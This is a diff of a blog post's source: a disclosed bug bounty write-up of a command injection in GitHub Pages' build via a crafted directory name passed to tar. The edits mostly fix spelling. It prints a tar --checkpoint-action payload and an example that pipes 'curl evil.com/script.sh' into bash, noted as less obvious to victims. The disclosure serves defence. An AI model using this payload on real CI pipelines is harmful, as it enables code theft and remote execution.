@@ -3,10 +3,10 @@ layout: "post"
 title:  "Command Injection in the GitHub Pages Build Pipeline"
 date:   "2022-08-25"
 author: "Joren Vrancken"
-lang: "en"
+lang: "en-us"
 ---
 
-Recently, I participated in the [GitHub Bug Bounty program](https://bounty.github.com/) (run through [HackerOne](https://hackerone.com/github)). This is a writeup of a command injection bug I discovered in GitHub Pages build process.
+Recently, I participated in the [GitHub Bug Bounty program](https://bounty.github.com/) (run through [HackerOne](https://hackerone.com/github)). This is a write-up of a command injection bug I discovered in GitHub Pages build process.
 
 ### GitHub Pages
 [GitHub Pages](https://pages.github.com/) is a static content hosting service. It allows users to host the content of their repositories at `username.github.io` or a custom domain. It is widely used for hosting simple static pages, such as documentation and blogs (e.g. this blog is hosted on GitHub Pages).
@@ -52,11 +52,11 @@ After the `POST` request, GitHub automatically creates a new commit to change th
 
 In the Pages settings, we are only able to specify two directories: `/` (i.e. the root of the branch) and `/docs`.
 
-![GitHub Pages directories](/assets/github-pages-command-injection/dirs.png)
+![](/assets/github-pages-command-injection/dirs.png)
 
-But what happens if we specify another directory in the theme chooser URL? It turns out, that this is accepted behaviour and GitHub will use any directory name we provide as the source. For example, if we use an esoteric directory name, like `source_dir=/"test" test test>`, GitHub will create a basic Jekyll setup in `/"test" test test>`:
+But what happens if we specify another directory in the theme chooser URL? It turns out, that this is accepted behavior and GitHub will use any directory name we provide as the source. For example, if we use an esoteric directory name, like `source_dir=/"test" test test>`, GitHub will create a basic Jekyll setup in `/"test" test test>`:
 
-![Arbitrary dir](/assets/github-pages-command-injection/arbitrary-dir.png)
+![](/assets/github-pages-command-injection/arbitrary-dir.png)
 
 GitHub is even nice enough to enable GitHub Pages and create the directory, if we did not do this ourselves.
 
@@ -72,7 +72,7 @@ GitHub Pages builds are actually just [GitHub Actions](https://docs.github.com/e
 2. `report-build-status`: Send telemetry data about the build processing ([`actions/deploy-pages@v1`](https://github.com/actions/deploy-pages)).
 3. `deploy`: Deploy the static files ([`actions/deploy-pages@v1`](https://github.com/actions/deploy-pages))
 
-`actions/upload-pages-artifact` is interesting, because uploading artitifacts most often happens with another action ([`actions/upload-artifact`](https://github.com/actions/upload-artifact)). What is the difference between the two?
+`actions/upload-pages-artifact` is interesting, because uploading artifacts most often happens with another action ([`actions/upload-artifact`](https://github.com/actions/upload-artifact)). What is the difference between the two?
 
 [The code of `actions/upload-pages-artifact@v0`](https://github.com/actions/upload-pages-artifact/blob/5abd6d2e035406f412d089536ee922a104d12f2b/action.yml) shows us that `actions/upload-pages-artifact` actually uses `actions/upload-artifact`, but first runs a `tar` command:
 
@@ -96,7 +96,7 @@ GitHub Pages builds are actually just [GitHub Actions](https://docs.github.com/e
         retention-days: ${{ inputs.retention-days }}{%endraw%}
 ```
 
-If we look at the GitHub Actions pipeline logs of a succesful Pages deployment (where we set the directory to `/docs`), we see the values of the variables in the `tar` command:
+If we look at the GitHub Actions pipeline logs of a successful Pages deployment (where we set the directory to `/docs`), we see the values of the variables in the `tar` command:
 
 ```Bash
 tar \
@@ -109,7 +109,7 @@ tar \
 
 This tells us that `inputs.path` is equal to `.<the direcotry we specify>/_site` and `runner.temp` equals `/home/runner/work/_temp`.
 
-In the previous section, we saw that we have full control over the direcotry name and because Linux (the OS used on the GitHub Actions runners) [allows virtually every character in directory names](https://en.wikipedia.org/wiki/Filename#Comparison_of_filename_limitations), we can set the directory name to anything we want. What happens if we set the directory to something like `/ --asdf=`? Will this change the `tar` command to the following?
+In the previous section, we saw that we have full control over the directory name and because Linux (the OS used on the GitHub Actions runners) [allows virtually every character in directory names](https://en.wikipedia.org/wiki/Filename#Comparison_of_filename_limitations), we can set the directory name to anything we want. What happens if we set the directory to something like `/ --asdf=`? Will this change the `tar` command to the following?
 
 ```bash
 tar \
@@ -122,12 +122,12 @@ tar \
 
 Yes, it will:
 
-![Tar asdf command](/assets/github-pages-command-injection/tar-command-asdf.png)
+![](/assets/github-pages-command-injection/tar-command-asdf.png)
 
 As we can see, `--asdf` is interpreted as a command line argument and not as part of the directory name. We have found command injection.
 
-### Arbitary Code Execution with `tar`
-`tar` has a feature, called [Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html), that we can use to run aribtrary commands.
+### Arbitrary Code Execution with `tar`
+`tar` has a feature, called [Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html), that we can use to run arbitrary commands.
 Adding the `--checkpoint=1 --checkpoint-action="exec=<command>"` arguments to a `tar` command will make it execute `<command>` for every processed file.
 
 From the [man page](https://man7.org/linux/man-pages/man1/tar.1.html):
@@ -155,16 +155,16 @@ This means our payload (i.e. the directory name we specify) is `/ --checkpoint=1
 
 ![Code execution](/assets/github-pages-command-injection/code-execution-id.png)
 
-Great! We have succesfully achieved arbitrary code execution.
+Great! We have successfully achieved arbitrary code execution.
 
-**Side note:** _Using `--checkpoint-action` is one way to achieve code execution, but not the only way. As we have full control over the input, we can exit the `tar` command and execute arbitrary commands. But by using `--checkpoint-action`, the `tar` command (and consequently the whole pipeline) will still succeed, making the attack less obivious to a victim._
+**Side note:** _Using `--checkpoint-action` is one way to achieve code execution, but not the only way. As we have full control over the input, we can exit the `tar` command and execute arbitrary commands. But by using `--checkpoint-action`, the `tar` command (and consequently the whole pipeline) will still succeed, making the attack less obvious to a victim._
 
 ### An Example Attack
-Now, you might be thinking: "You found command injection vulnerablity on a GitHub Actions runner as an admin. Big deal. So, what? Running arbitrary code specified by users is exactly what CI runners are for. You just found a way to do it in extra steps."
+Now, you might be thinking: "You found command injection vulnerability on a GitHub Actions runner as an admin. Big deal. So, what? Running arbitrary code specified by users is exactly what CI runners are for. You just found a way to do it in extra steps."
 
 And you would be correct. However, what makes this exploitable is the fact that it can be triggered through a URL.
 
-Say we are an attacker that wants to get access to the code in a private repo of a company. We can use this vulnerablity to get access to the code:
+Say we are an attacker that wants to get access to the code in a private repo of a company. We can use this vulnerability to get access to the code:
 
 1. We craft a malicious payload: `/ --checkpoint=1 --checkpoint-action="exec=curl -s evil.com/script.sh | bash" --exclude=`.
   * This payload downloads and executes a script from an attacker controlled server.
@@ -201,9 +201,9 @@ GitHub resolved the problem by removing the Theme Chooser functionality. The Pag
 ### Closing Thoughts
 This was definitely one of the more fun bug bounties I did, because it combines multiple GitHub-specific features with some more traditional Hack The Box-esque techniques (e.g. using `--checkpoint-action`).
 
-I wholeheartly recommend the GitHub bug bounty program. Their triage team responded quickly and took time to really understand the reports I sent in.
+I wholeheartedly recommend the GitHub bug bounty program. Their triage team responded quickly and took time to really understand the reports I sent in.
 
----
+----
 
 ### Disclosure Timeline
 _All times are in CEST._
